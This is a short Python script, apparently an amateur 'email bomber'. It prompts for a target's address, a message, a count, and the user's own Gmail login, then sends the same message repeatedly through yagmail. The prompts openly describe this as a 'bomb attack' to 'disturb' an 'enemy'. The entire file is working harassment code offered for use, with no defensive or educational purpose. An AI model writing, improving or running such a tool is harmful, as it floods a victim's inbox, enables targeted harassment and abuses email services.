import yagmail
r=input("i m very disturtbing partical tell me ur enemies email id ")
z=0
msg=input("enter a nice body ")
sub=input("and subject also")
b=int(input("how many times shall i disturb tell me asap"))
f=input("enter your gmail email id now  ")
pwd=input("did u forget to gimme password so that i can give a nice bomb attack? tell me the pass else i wont be able to wrk tell me asap now fast ")
for i in range (0,b): 
    email=yagmail.SMTP(user=f,password=pwd)
    email.send(to=r,subject=sub,contents=msg)
    print ("ok the bomb attack has succesfully srarted if u have typed correct email ids and passwords pls check ur sent mails to chk that  how many mails have been sent so far if the terminal is opened then it means its still sending mails so dont close it hava nice day")